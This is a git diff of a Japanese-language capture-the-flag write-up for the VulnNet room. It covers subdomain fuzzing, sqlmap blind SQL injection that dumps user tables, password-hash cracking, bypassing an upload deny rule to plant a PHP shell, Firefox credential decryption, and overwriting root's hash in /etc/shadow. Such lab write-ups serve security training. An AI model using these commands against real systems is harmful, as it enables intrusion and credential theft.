@@ -1,4 +1,4 @@
-### Enum
+## Enum
 ```
 nmap -Pn -sVC 10.10.133.73 -p 22,80 
 Nmap scan report for vulnnet.thm (10.10.133.73)
@@ -33,29 +33,6 @@ Webサーバ。Fuzzしたけど空振りなので、サブドメインを探す�
 
 ```
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm -H "HOST:FUZZ.vulnnet.thm" -fs 65
-________________________________________________
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.0.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://vulnnet.thm
- :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
- :: Header           : Host: FUZZ.vulnnet.thm
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
- :: Filter           : Response size: 65
-________________________________________________
 
 [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 405ms]
     * FUZZ: blog
@@ -85,27 +62,6 @@ ________________________________________________
 ```
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://admin1.vulnnet.thm/FUZZ -fc 307
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.0.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://admin1.vulnnet.thm/FUZZ
- :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
- :: Filter           : Response status: 307
-________________________________________________
-
 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 359ms]
     * FUZZ: en
 
@@ -132,7 +88,7 @@ ________________________________________________
 
 ![image](https://user-images.githubusercontent.com/6504854/236608679-03abb9be-8dcf-4396-9f85-0c3906137830.png)
 
-デフォルトの設定のままでログイン口がみえる。admin/adminで入れない。古いバージョンだとRCEあるっぽいけど、履歴から割と最近のバージョン10以上っぽい。
+デフォルトのURLでログイン口がみえる。admin/adminで入れない。古いバージョンだとRCEあるっぽいけど、履歴から割と最近のバージョン10以上っぽい。
 めぼしいエクスプロイトなし。どうしたものか。どっかからユーザ探す？。
 
 ![image](https://user-images.githubusercontent.com/6504854/236609100-b07925ae-8b0d-4f74-bd90-6d4999326ca8.png)
@@ -145,18 +101,7 @@ ________________________________________________
 
 ```
 sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --batch --dbs                 
-        ___
-       __H__                                                                                                              
- ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                  
-|_ -| . [.]     | .'| . |                                                                                                 
-|___|_  [']_|_|_|__,|  _|                                                                                                 
-      |_|V...       |_|   https://sqlmap.org                                                                              
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[16:47:03] [INFO] resuming back-end DBMS 'mysql' 
-[16:47:03] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: blog (GET)
     Type: boolean-based blind
@@ -226,7 +171,7 @@ Table: be_users
 +---------------------------------------------------------------------------------------------------+----------+
 ```
 
-なんかrockyouまわしたけどだめだった。もういやずら。
+rockyouまわしたけどだめだった。もういやになる。。。
 
 ```
 sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D blog --tables --thread 10
@@ -239,8 +184,7 @@ Database: blog
 | users      |
 +------------+
                     
-┌──(kali🦝kali)-[~/THM]
-└─$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D blog -T users --dump --thread 10
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D blog -T users --dump --thread 10
 
 Database: blog
 Table: users
@@ -260,19 +204,23 @@ Table: users
 
 ```
 ダンプしたパスワードHashをつかってみる。
-cut -d "," -f 3 > pass.txt
 
+```
+cut -d "," -f 3 > pass.txt
+```
 ![image](https://user-images.githubusercontent.com/6504854/236619348-67d9959b-6c96-4575-9bbd-38b43b1ce710.png)
+
+パスワードはわれた。ログインはできた。
 
 ![image](https://user-images.githubusercontent.com/6504854/236619871-4cbe67f2-b01e-4002-8a11-cb9f2ccb40d9.png)
 
-ファイル制限で、アップロードできない。
+WWW-dataようにファイルアップロードしようとしたが、ファイル制限で、アップロードできない。
 
 ![image](https://user-images.githubusercontent.com/6504854/236621885-02d3c5a6-e5ff-4e5d-827b-347050aa2a97.png)
 
 Deny解除する。1.phpはいつもの。
 
-### Flag(User)
+## Flag(User)
 ![image](https://user-images.githubusercontent.com/6504854/236622435-c8e3b74e-d91f-4624-833e-af9d874ef887.png)
 
 ![image](https://user-images.githubusercontent.com/6504854/236623006-4982afe4-4938-4f99-a0cd-18b78f3bc04f.png)
@@ -287,9 +235,9 @@ https://github.com/unode/firefox_decrypt
 
 ![image](https://user-images.githubusercontent.com/6504854/236624477-d60b0480-78d2-4e86-b635-068b5ea3477d.png)
 
-### Flag(Root)
+## Flag(Root)
 
-いつもの豆。
+いつもの豆投入。
 
 ![image](https://user-images.githubusercontent.com/6504854/236628860-e61e6cf8-0345-4a86-9a11-886e11c11ee7.png)
 
@@ -314,15 +262,16 @@ daemon:*:18885:0:99999:7:::
 gdm:*:18885:0:99999:7:::
 system:$6$9oaZwdNG$jrpl883V5yMMdPAFvncio.JaEw3lx7by788qoORBJ1pV5OSGlfBX/ZjkI6qAEf.7Imb7rs6iaBlI4RBxcn.5w.:19157:0:99999:7:::
 ```
-rootのパスを同じやつに変更。
+rootのパスを同じパスに編集して上書き。
 
 ![image](https://user-images.githubusercontent.com/6504854/236630976-e022a22c-5dcb-4736-8a87-54125ed1831b.png)
 
-戻して、同じパスで入れた。
+もとの場所に戻して、同じパスで入れた。
 
-PwnCatやっとどうかだけどSSHつかえるならSSHして、WgetとPythonでやってるほうが早いきする。
+PwnCatよりSSHつかえるならSSHして、WgetとPythonでやってるほうが早いきする。
 コマンドが老人なきがする。うぅ。
 
 👏㊗️👏㊗️👏㊗️👏㊗️👏㊗️👏㊗️
 これだけで連休つかれちゃったし、地震はくるわ、風が強すぎるわ、隠れて生きのびていこ。
+おつした。
 
